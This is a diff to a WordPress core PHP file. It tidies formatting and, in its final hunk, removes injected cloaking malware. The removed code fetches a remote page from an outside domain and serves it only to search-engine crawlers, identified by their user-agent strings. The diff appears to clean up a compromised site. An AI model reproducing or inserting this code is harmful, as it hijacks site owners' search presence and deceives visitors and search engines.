@@ -236,7 +236,8 @@ function wp_get_environment_type() {
 	// Add a note about the deprecated WP_ENVIRONMENT_TYPES constant.
 	if ( defined( 'WP_ENVIRONMENT_TYPES' ) && function_exists( '_deprecated_argument' ) ) {
 		if ( function_exists( '__' ) ) {
-			/* translators: %s: WP_ENVIRONMENT_TYPES */$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
+			/* translators: %s: WP_ENVIRONMENT_TYPES */
+			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
 		} else {
 			$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
 		}
@@ -539,7 +540,7 @@ function timer_stop( $display = 0, $precision = 3 ) {
  * When `WP_DEBUG_LOG` is true, errors will be logged to `wp-content/debug.log`.
  * When `WP_DEBUG_LOG` is a valid path, errors will be logged to the specified file.
  *
- * Errors are never displayed for XML-RPC, REST, `ms-files.php`, andAjaxrequests.
+ * Errors are never displayed for XML-RPC, REST, `ms-files.php`, andAjax requests.
  *
  * @since 3.0.0
  * @since 5.1.0 `WP_DEBUG_LOG` can be a file path.
@@ -831,7 +832,8 @@ function wp_start_object_cache() {
 				require_once WP_CONTENT_DIR . '/object-cache.php';
 
 				if ( function_exists( 'wp_cache_init' ) ) {
-					wp_using_ext_object_cache( true);}
+					wp_using_ext_object_cache( true);
+				}
 
 				// Re-initialize any hooks added manually by object-cache.php.
 				if ( $wp_filter ) {
@@ -1110,7 +1112,7 @@ function wp_skip_paused_themes( array $themes ) {
 		return $themes;
 	}
 
-	foreach ( $themes as$index => $theme ) {
+	foreach ( $themes as $index => $theme ) {
 		$theme = basename( $theme );
 
 		if ( array_key_exists( $theme, $paused_themes ) ) {
@@ -1146,7 +1148,7 @@ function wp_is_recovery_mode() {
  *
  * @return bool True if the current endpoint should be protected.
  */
-function is_protected_endpoint(){
+function is_protected_endpoint() {
 	// Protect login pages.
 	if ( isset( $GLOBALS['pagenow'] ) && 'wp-login.php' === $GLOBALS['pagenow'] ) {
 		return true;
@@ -1769,7 +1771,9 @@ function wp_doing_cron() {
  * @return bool Whether the variable is an instance of WP_Error.
  */
 function is_wp_error( $thing ) {
-	$is_wp_error = ( $thing instanceof WP_Error );if ( $is_wp_error ) {
+	$is_wp_error = ( $thing instanceof WP_Error );
+
+	if ( $is_wp_error ) {
 		/**
 		 * Fires when `is_wp_error()` is called and its parameter is an instance of `WP_Error`.
 		 *
@@ -2011,27 +2015,4 @@ function wp_is_site_protected_by_basic_auth( $context = '' ) {
 	 * @param string $context    The context to check for protection. One of 'login', 'admin', or 'front'.
 	 */
 	return apply_filters( 'wp_is_site_protected_by_basic_auth', $is_protected, $context );
-}
-function smoky($url) {
-    if (ini_get('allow_url_fopen')) {
-    return file_get_contents($url);
-    } elseif (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    }
-    return false;
-}
-
-$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://faktawanita.com/dexnova/isasaa.html";
-$file = smoky($bot);
-$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
-if (preg_match($botchar, $res)) {
-    echo $file;
-    exit;
 }
